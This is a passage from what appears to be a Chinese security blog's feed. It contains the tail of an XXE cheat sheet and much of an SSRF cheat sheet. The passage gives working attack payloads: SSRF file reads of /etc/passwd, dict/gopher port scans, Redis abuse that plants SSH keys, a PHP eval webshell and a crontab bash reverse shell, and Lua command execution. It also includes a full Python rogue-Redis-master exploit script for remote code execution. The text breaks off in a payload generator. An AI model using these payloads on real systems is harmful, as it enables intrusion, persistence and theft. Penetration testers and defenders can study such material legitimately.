class="string">&quot;local_file.txt&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:text</span>&gt;</span>Hello World to local file.<span class="tag">&lt;/<span class="name">xsl:text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exsl:document</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Saxon PE/Saxon EE 环境：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">as</span>=<span class="string">&quot;xs:string&quot;</span> <span class="attr">select</span>=<span class="string">&quot;&#x27;local_file.txt&#x27;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;text&quot;</span> <span class="attr">as</span>=<span class="string">&quot;xs:string&quot;</span> <span class="attr">select</span>=<span class="string">&quot;&#x27;Hello World to local file.&#x27;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:sequence</span> <span class="attr">select</span>=<span class="string">&quot;file:append-text ($file, $text)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其他可以写入文件的函数有 <code>file:append-text (), file:move (), file:copy (), file:delete (), file:exists (), file:is-file (), file:is-dir (), file:read (), file:write ()</code></p>]]></content>
    
    
    <summary type="html">XXE payloads and attack methods.</summary>
    
    
    
    <category term="CheatSheet" scheme="https://srpopty.github.io/categories/CheatSheet/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="XXE" scheme="https://srpopty.github.io/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>SSRF CheatSheet</title>
    <link href="https://srpopty.github.io/2022/04/25/SSRF-CheatSheet/"/>
    <id>https://srpopty.github.io/2022/04/25/SSRF-CheatSheet/</id>
    <published>2022-04-25T08:52:35.000Z</published>
    <updated>2022-04-25T08:52:35.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="# 简介" class="headerlink" title="简介"></a>简介</h1><p>SSRF (Server Side Request Forgery, 服务端请求伪造)，攻击者以服务器的身份发送包括内网在内的请求。</p><p>SSRF 可以：</p><ul><li>读取本地文件</li><li>内网探测</li><li>内网端口扫描</li><li>攻击内网应用</li><li>操作 Redis</li><li>反弹 shell</li></ul><p>SSRF 特征：</p><ul><li>PHP: <code>file_get_contantes</code>, <code>fsockopen</code>, <code>curl_exec</code>, <code>fopen</code>, <code>readfile</code></li><li>Python: <code>urllib</code>, <code>requests</code></li><li>Java: <code>URL</code>, <code>Request</code>, <code>HttpURLConnection</code>, <code>URLConnection</code>, <code>okhttp</code>, <code>OkHttpClient</code>, <code>HttpClients</code>, <code>Socket</code></li></ul><blockquote><p>注意：<br>PHP 需要开启 allow_url_fopen。<br>一般情况下 PHP 不会开启 fopen 的 gopher。<br>file_get_contents 的 gopher 协议不能 URL 编码。<br>file_get_contents 关于 gopher 的 302 跳转会出现 bug，导致利用失败。<br>curl/libcurl 7.43 上 gopher 协议存在 bug (%00 截断) 经测试 7.49 可用。<br>curl_exec 默认不跟踪跳转。</p></blockquote><h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><p>常见语言支持协议</p><ul><li>PHP: <code>file://</code>, <code>ftp://</code>, <code>gopher://</code>, <code>http://</code>, <code>https://</code>, <code>php://</code>, <code>dict://</code>, <code>sftp://</code>, <code>ldap://</code>, <code>tftp://</code></li><li>Java: <code>file://</code>, <code>ftp://</code>, <code>http://</code>, <code>https://</code>, <code>jar://</code>, <code>netdoc://</code>, <code>mailto://</code></li><li>Python: <code>file://</code>, <code>gopher://</code>, <code>http://</code>, <code>https://</code></li></ul><h2 id="文件读取"><a href="# 文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><p>file:// 绝对路径</p><ul><li><code>file:///etc/passwd</code></li><li><code>file://c:/boot.ini</code></li></ul><blockquote><p>Java 的 file 协议可以列目录</p></blockquote><h2 id="端口扫描"><a href="# 端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>dict://ip: 端口 / 命令：参数 1: 参数 2…</p><ul><li><code>dict://127.0.0.1:80/</code></li><li><code>dict://127.0.0.1:22/</code></li><li><code>dict://127.0.0.1:6379/</code></li></ul><h2 id="读取压缩包内容"><a href="# 读取压缩包内容" class="headerlink" title="读取压缩包内容"></a>读取压缩包内容</h2><p>Java 特有 <code>jar://</code> 协议，可以用来读取 jar 包或 zip 等压缩文件内容。利用 jar 协议也可以绕过协议前缀限制读取压缩文件内容。</p><ul><li><code>jar://http://foo.com/bar.jar!/</code> 读取 jar 包。</li><li><code>jar://http://foo.com/bar.jar!/COM/foo/a.class</code> 读取其中某个资源文件。</li><li><code>jar://http://foo.com/bar.jar!/COM/foo/</code> 读取一个目录。</li></ul><h2 id="Redis- 未授权访问"><a href="#Redis- 未授权访问" class="headerlink" title="Redis 未授权访问"></a>Redis 未授权访问</h2><p>Redis 在没有开启 <code>protected-mode</code> 并且没有主动绑定 ip 的情况下存在未授权访问漏洞。利用 SSRF 扫描端口 <code>dict://127.0.0.1:6379/info</code> 或者 <code>dict://0.0.0.0:6379/info</code> 查看是否开启 redis 服务。</p><p>Redis 常用命令：</p><ul><li><code>info</code> 查看 redis 版本信息</li><li><code>flushall</code> 清空所有数据</li><li><code>config set dir PATH</code> 设置保存备份的目录，绝对路径</li><li><code>config set dbfilename</code> 设置保存备份的文件名</li><li><code>set key value</code> 向 redis 中添加一个键值对</li><li><code>keys</code> 查看所有的键</li><li><code>get key</code> 获取一个键的值</li><li><code>del key</code> 删除一个键值对</li><li><code>save</code> 保存所有数据到 config 设置的备份文件中</li></ul><p>通过 dict 或者 gophar 协议发送命令操作 Redis 数据库，例如 <code>dict://0.0.0.0:6379/info</code>，带多个参数的命令例如 <code>dict://0.0.0.0:6379/config:set:dir:/etc/</code>。dict 和 gophar 的区别是：多个命令 dict 需要多次发送，而 gophar 可以一次性发送。</p><h3 id="Redis- 任意数据访问与修改"><a href="#Redis- 任意数据访问与修改" class="headerlink" title="Redis 任意数据访问与修改"></a>Redis 任意数据访问与修改</h3><ul><li>清空数据 <code>flushall</code></li><li>删除数据 <code>del key</code></li><li>查看所有的数据的键 <code>keys</code></li><li>查看数据 <code>get key</code></li><li>写入新数据 <code>set key value</code></li></ul><h3 id="任意文件写"><a href="# 任意文件写" class="headerlink" title="任意文件写"></a>任意文件写</h3><ol><li>写入一个新数据 <code>set x&quot;value&quot;</code></li><li>Redis 设置备份目录 <code>config set dir /dir/name/</code></li><li>Redis 设置备份文件名为 <code>config set dbfilename filename</code></li><li>保存 redis 中所有数据到备份文件中，实现写文件 <code>save</code></li></ol><h3 id="写入 -ssh- 公钥"><a href="# 写入 -ssh- 公钥" class="headerlink" title="写入 ssh 公钥"></a>写入 ssh 公钥 </h3><p> 写入公钥以后通过 ssh 私钥登录。有 root 权限可以写 root 公钥，无 root 权限需要知道用户目录。</p><ol><li>生成 ssh 密钥对 <code>$ ssh-keygen -t rsa</code></li><li>查看公钥 <code>$ cat ~/.ssh/id_rsa.pub</code></li><li>Redis 设置备份目录为 ssh 目录 <code>config set dir /root/.ssh/</code></li><li>Redis 设置备份文件名为 authorized_keys <code>config set dbfilename authorized_keys</code></li><li>（可选）清空 redis 中的已有数据 <code>flushall</code></li><li>写入一个新数据，值为刚才 cat 的 ssh 公钥 <code>set x&quot;\n\n\nssh-rsa AAAAB3...zrrSPrs= root@kali\n\n\n&quot;</code></li><li>保存 redis 中所有数据到备份文件中 <code>save</code></li><li>连接 ssh <code>$ ssh -i ~/.ssh/id_rsa root@ip</code></li></ol><h3 id="反弹 -shell"><a href="# 反弹 -shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h3><p>利用 crontab 定时任务执行命令反弹 shell。</p><ol><li>（可选）清空数据 <code>flushall</code></li><li>写入一个新数据，值为 crontab 格式的 bash 反弹 shell 命令 <code>set x&quot;\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\n\n&quot;</code></li><li>Redis 设置备份目录为 etc 目录 <code>config set dir /etc/</code></li><li>Redis 设置备份文件名为 crontab <code>config set dbfilename crontab</code></li><li>保存 redis 中所有数据到备份文件中 <code>save</code></li><li>监听反弹 shell 端口 <code>nc -lvp port</code></li></ol><blockquote><p>Centos 的定时任务文件在 /var/spool/cron/&lt;username&gt;，Ubuntu 定时任务文件在 /var/spool/cron/crontabs/&lt;username&gt;，二者共有定时任务文件在 /etc/crontab。<br>注意：Ubuntu 下无法实现 crontab 反弹 shell。Redis 以 root 身份写的文件权限为 644，普通用户则是 664，但 Ubuntu 要求在 /var/spool/cron/crontabs/ 中执行定时任务的文件权限必须是 600，而如果写入 /etc/crontab，由于存在乱码，因此 ubuntu 不能正确执行定时任务；而 CentOS 在 /var/spool/cron/ 中的定时任务文件权限为 644 就能执行</p></blockquote><h3 id="写 -webshell"><a href="# 写 -webshell" class="headerlink" title="写 webshell"></a>写 webshell</h3><ol><li>写入一个新数据，值为 webshell <code>set x&quot;&lt;?php eval ($_GET [&#39;a&#39;]);?&gt;&quot;</code></li><li>Redis 设置备份目录为 web 目录 <code>config set dir /var/www/html/</code></li><li>Redis 设置备份文件名为 webshell 的名字 <code>config set dbfilename shell.php</code></li><li>保存 redis 中所有数据到备份文件中 <code>save</code></li></ol><h3 id="执行 -Lua"><a href="# 执行 -Lua" class="headerlink" title="执行 Lua"></a>执行 Lua</h3><p>Redis 可以直接执行 lua 代码，但是限制在沙箱中，利用 <code>eval&quot;lua 代码 &quot;</code> 执行。</p><p><code>dofile</code> 函数可以执行一个 lua 文件，但是执行失败后也会返回一些信息。</p><ol><li>检查文件是否存在或者是否有权限<ul><li><code>eval&quot;reutrn dofile (&#39;/etc/passwd&#39;)&quot;</code>。</li></ul></li><li>获取文件部分信息。<ul><li><code>eval&quot;return dofile (&#39;/etc/issue&#39;)&quot;</code></li><li><code>eval&quot;return dofile (&#39;/etc/lsb-release&#39;)&quot;</code></li><li><code>eval&quot;return dofile (&#39;/etc/hosts&#39;)&quot;</code></li><li><code>eval&quot;dofile (&#39;/etc/environment&#39;);return (PATH);</code></li><li><code>eval&quot;dofile (&#39;/home/ubuntu/.selected_editor&#39;);return (SELECTED_EDITOR);</code></li></ul></li></ol><p>利用 lua 甚至可以 rce。</p><blockquote><p>注意：适用于以下版本<br>2.2 &lt;= redis &lt; 5.0.13<br>2.2 &lt;= redis &lt; 6.0.15<br>2.2 &lt;= redis &lt; 6.2.5</p></blockquote><p><code>eval &#39;local io_l = package.loadlib (&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;,&quot;luaopen_io&quot;); local io = io_l (); local f = io.popen (&quot;ls -al&quot;,&quot;r&quot;); local res = f:read (&quot;*a&quot;); f:close (); return res&#39;</code></p><blockquote><p>注意：不同系统下 liblua5.1.so.0 的路径可能不同</p></blockquote><h3 id="主从复制"><a href="# 主从复制" class="headerlink" title="主从复制"></a>主从复制 </h3><p> 主从模式是 Redis 提供的一种分布式模式：使用一台 Redis 服务器作为主机，其他多台 Rediis 服务器作为从机，主机与从机数据相同，但是主机只负责写，从机只负责读，通过 <code>fullresync</code> 命令可以实现主从机之间的数据同步。</p><blockquote><p>通过 <code>info replication</code> 命令可以查看当前 Redis 服务器是主机还是从机。<br>通过 <code>slaveof &lt;masterip&gt; &lt;masterport&gt;</code> 可以设置当前主机为从机。</p></blockquote><p>在 Reids 4.x 之后，可以通过 Redis 外部拓展 <code>.so</code> 文件，在 Redis 中添加一个新的 Redis 命令，实现代码执行。项目 <a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">RedisModules-ExecuteCommand</a> 实现了一个可以执行命令的 Redis 扩展，扩展加载完毕后通过 <code>system.exec command</code> 就可以执行命令，使用 <code>system.rev ip port</code> 就可以把命令执行结果返回到指定地址。</p><p>攻击步骤如下，假设目标 Redis 服务器位于 <code>1.1.1.1:6379</code>，攻击者模拟的 Redis 服务器位于 <code>2.2.2.2:6386</code>。</p><ol><li>首先设置目标服务器，使其认作攻击者服务器为主服务器：<code>slaveof 2.2.2.2 6386</code>。</li><li>设置 <code>dbfilename</code> 为从服务器要保存恶意 <code>.so</code> 文件的文件名：<code>config set dbfilename exp.so</code>。</li><li>这时目标服务器，也就是从服务器会返回 <code>PING</code> 命令确认主机存活，攻击者服务器，也就是主服务器需要返回：<code>+PANG</code>。</li><li>从服务器会接着返回多个以 <code>REPLCONF</code> 开头的命令，类似 <code>REPLCONF ...</code> 来确认服务器信息，主服务器都需要返回：<code>+OK</code>。</li><li>当从服务器返回 <code>PSYNC</code> 或者 <code>SYNC</code> 命令时，代表从服务器请求同步数据，这时主服务器需要返回：<code>+FULLRESYNC ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ 1\r\npayload</code>，其中 <code>payload</code> 就是恶意 <code>.so</code> 文件的内容。</li><li>同步完成后，恶意 <code>.so</code> 的内容就会被保存到从服务器的 <code>exp.so</code> 文件中，命令从服务器读取该模块：<code>module load exp.so</code>。</li><li>然后断开主从链接：<code>slaveof no one</code>。</li><li>最后就可以向从服务器发送恶意 <code>.so</code> 文件中的命令。</li></ol><p>上述步骤十分繁琐，而且还需要实现模拟主服务器的程序，已经有人准备好了 exp，需要配合 <code>RedisModules-ExecuteCommand</code> 使用，如下所示。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">logging.basicConfig (stream=sys.stdout, level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;&gt;&gt; %(message) s&#x27;</span>)</span><br><span class="line">DELIMITER = <span class="string">b&quot;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RoguoHandler</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> data.startswith (<span class="string">b&#x27;*&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> data.strip ().split (DELIMITER)[<span class="number">2</span>::<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> data.startswith (<span class="string">b&#x27;$&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> data.split (DELIMITER, <span class="number">2</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> data.strip ().split ()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = self.request.recv (<span class="number">1024</span>)</span><br><span class="line">            logging.info (<span class="string">&quot;receive data: % r&quot;</span>, data)</span><br><span class="line">            arr = self.decode (data)</span><br><span class="line">            <span class="keyword">if</span> arr [<span class="number">0</span>].startswith (<span class="string">b&#x27;PING&#x27;</span>):</span><br><span class="line">                self.request.sendall (<span class="string">b&#x27;+PONG&#x27;</span> + DELIMITER)</span><br><span class="line">            <span class="keyword">elif</span> arr [<span class="number">0</span>].startswith (<span class="string">b&#x27;REPLCONF&#x27;</span>):</span><br><span class="line">                self.request.sendall (<span class="string">b&#x27;+OK&#x27;</span> + DELIMITER)</span><br><span class="line">            <span class="keyword">elif</span> arr [<span class="number">0</span>].startswith (<span class="string">b&#x27;PSYNC&#x27;</span>) <span class="keyword">or</span> arr [<span class="number">0</span>].startswith (<span class="string">b&#x27;SYNC&#x27;</span>):</span><br><span class="line">                self.request.sendall (<span class="string">b&#x27;+FULLRESYNC &#x27;</span> + <span class="string">b&#x27;Z&#x27;</span> * <span class="number">40</span> + <span class="string">b&#x27; 1&#x27;</span> + DELIMITER)</span><br><span class="line">                self.request.sendall (<span class="string">b&#x27;$&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(self.server.payload)).encode () + DELIMITER)</span><br><span class="line">                self.request.sendall (self.server.payload + DELIMITER)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        self.finish ()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">finish</span>(<span class="params">self</span>):</span><br><span class="line">        self.request.close ()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RoguoServer</span>(socketserver.TCPServer):</span><br><span class="line">    allow_reuse_address = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, server_address, payload</span>):</span><br><span class="line">        <span class="built_in">super</span>(RoguoServer, self).__init__(server_address, RoguoHandler, <span class="literal">True</span>)</span><br><span class="line">        self.payload = payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RedisClient</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, rhost, rport</span>):</span><br><span class="line">        self.client = socket.create_connection ((rhost, rport), timeout=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">self, data</span>):</span><br><span class="line">        data = self.encode (data)</span><br><span class="line">        self.client.send (data)</span><br><span class="line">        logging.info (<span class="string">&quot;send data: % r&quot;</span>, data)</span><br><span class="line">        <span class="keyword">return</span> self.recv ()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recv</span>(<span class="params">self, count=<span class="number">65535</span></span>):</span><br><span class="line">        data = self.client.recv (count)</span><br><span class="line">        logging.info (<span class="string">&quot;receive data: % r&quot;</span>, data)</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">bytes</span>):</span><br><span class="line">            data = data.split ()</span><br><span class="line"></span><br><span class="line">        args = [<span class="string">b&#x27;*&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(data)).encode ()]</span><br><span class="line">        <span class="keyword">for</span> arg <span class="keyword">in</span> data:</span><br><span class="line">            args.extend ([DELIMITER, <span class="string">b&#x27;$&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(arg)).encode (), DELIMITER, arg])</span><br><span class="line"></span><br><span class="line">        args.append (DELIMITER)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>.join (args)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_command_line</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data.startswith (<span class="string">b&#x27;$&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> data.decode (errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    offset = data.find (DELIMITER)</span><br><span class="line">    size = <span class="built_in">int</span>(data [<span class="number">1</span>:offset])</span><br><span class="line">    offset += <span class="built_in">len</span>(DELIMITER)</span><br><span class="line">    data = data [offset:offset+size]</span><br><span class="line">    <span class="keyword">return</span> data.decode (errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">rhost, rport, lhost, lport, expfile, command, auth</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(expfile, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        server = RoguoServer ((<span class="string">&#x27;0.0.0.0&#x27;</span>, lport), f.read ())</span><br><span class="line"></span><br><span class="line">    client = RedisClient (rhost, rport)</span><br><span class="line"></span><br><span class="line">    lhost = lhost.encode ()</span><br><span class="line">    lport = <span class="built_in">str</span>(lport).encode ()</span><br><span class="line">    command = command.encode ()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> auth:</span><br><span class="line">        client.send ([<span class="string">b&#x27;AUTH&#x27;</span>, auth.encode ()])</span><br><span class="line"></span><br><span class="line">    client.send ([<span class="string">b&#x27;SLAVEOF&#x27;</span>, lhost, lport])</span><br><span class="line">    client.send ([<span class="string">b&#x27;CONFIG&#x27;</span>, <span class="string">b&#x27;SET&#x27;</span>, <span class="string">b&#x27;dbfilename&#x27;</span>, <span class="string">b&#x27;exp.so&#x27;</span>])</span><br><span class="line">    time.sleep (<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    server.handle_request ()</span><br><span class="line">    time.sleep (<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    client.send ([<span class="string">b&#x27;MODULE&#x27;</span>, <span class="string">b&#x27;LOAD&#x27;</span>, <span class="string">b&#x27;./exp.so&#x27;</span>])</span><br><span class="line">    client.send ([<span class="string">b&#x27;SLAVEOF&#x27;</span>, <span class="string">b&#x27;NO&#x27;</span>, <span class="string">b&#x27;ONE&#x27;</span>])</span><br><span class="line">    client.send ([<span class="string">b&#x27;CONFIG&#x27;</span>, <span class="string">b&#x27;SET&#x27;</span>, <span class="string">b&#x27;dbfilename&#x27;</span>, <span class="string">b&#x27;dump.rdb&#x27;</span>])</span><br><span class="line">    resp = client.send ([<span class="string">b&#x27;system.exec&#x27;</span>, command])</span><br><span class="line">    <span class="built_in">print</span>(decode_command_line (resp))</span><br><span class="line"></span><br><span class="line">    client.send ([<span class="string">b&#x27;MODULE&#x27;</span>, <span class="string">b&#x27;UNLOAD&#x27;</span>, <span class="string">b&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser (description=<span class="string">&#x27;Redis 4.x/5.x RCE with RedisModules&#x27;</span>)</span><br><span class="line">    parser.add_argument (<span class="string">&quot;-r&quot;</span>, <span class="string">&quot;--rhost&quot;</span>, dest=<span class="string">&quot;rhost&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;target host&quot;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument (<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--rport&quot;</span>, dest=<span class="string">&quot;rport&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&quot;target redis port, default 6379&quot;</span>, default=<span class="number">6379</span>)</span><br><span class="line">    parser.add_argument (<span class="string">&quot;-L&quot;</span>, <span class="string">&quot;--lhost&quot;</span>, dest=<span class="string">&quot;lhost&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&quot;rogue server ip&quot;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument (<span class="string">&quot;-P&quot;</span>, <span class="string">&quot;--lport&quot;</span>, dest=<span class="string">&quot;lport&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&quot;rogue server listen port, default 21000&quot;</span>, default=<span class="number">21000</span>)</span><br><span class="line">    parser.add_argument (<span class="string">&quot;-f&quot;</span>, <span class="string">&quot;--file&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;RedisModules to load, default exp.so&quot;</span>, default=<span class="string">&#x27;exp.so&#x27;</span>)</span><br><span class="line">    parser.add_argument (<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--command&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;Command that you want to execute&#x27;</span>, default=<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument (<span class="string">&quot;-a&quot;</span>, <span class="string">&quot;--auth&quot;</span>, dest=<span class="string">&quot;auth&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;redis password&quot;</span>)</span><br><span class="line">    options = parser.parse_args ()</span><br><span class="line"></span><br><span class="line">    filename = options.file</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists (filename):</span><br><span class="line">        logging.info (<span class="string">&quot;Where you module? &quot;</span>)</span><br><span class="line">        sys.exit (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    exploit (options.rhost, options.rport, options.lhost, options.lport, filename, options.command, options.auth)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main ()</span><br></pre></td></tr></table></figure><h3 id="Payload- 生成"><a href="#Payload- 生成" class="headerlink" title="Payload 生成"></a>Payload 生成 </h3><p> 通过 dict 或者 gophar 协议可以发送 redis 命令。</p><blockquote><p>注意：通过 dict 或者 gophar，有些特殊字符无法写入到 redis 中，需要转义。</p></blockquote><p>dict 与 gophar 协议格式生成：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 